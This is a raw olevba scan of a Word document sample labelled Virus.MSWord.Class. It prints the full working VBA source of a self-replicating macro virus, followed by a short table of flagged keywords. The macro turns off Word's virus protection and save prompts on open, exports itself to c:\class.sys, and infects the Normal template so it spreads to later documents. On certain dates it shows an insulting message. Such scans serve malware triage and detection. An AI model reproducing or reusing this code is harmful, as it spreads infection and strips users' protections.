olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-4cee61e548951b10f90b93f45c0f9c7f556f77cf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-4cee61e548951b10f90b93f45c0f9c7f556f77cf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
On Error GoTo out
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
Options.VirusProtection = False
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
Options.SaveNormalPrompt = False
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
Options.ConfirmConversions = False
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
If nt > 70 And ad > 0 Then GoTo out
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
If nt < 70 Then
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
End If
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
host.codemodule.AddFromFile ("c:\class.sys")
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
With host.codemodule
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
    For x = 1 To 4
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
    .deletelines 1
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
    Next x
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
End With
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
If nt < 70 Then
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
    With host.codemodule
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
    .replaceline 1, "Sub AutoClose()"
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
    .replaceline 71, "Sub ToolsMacro()"
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
    End With
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
End If
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
With host.codemodule
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
    For x = 2 To 72 Step 2
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
    Next x
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
End With
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
out:
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
End Sub
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
Sub ViewVBCode()
'HH25.01.99 18:08:23\\AS400\PRT05 on NE00:Dokument2Karl Klammer
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

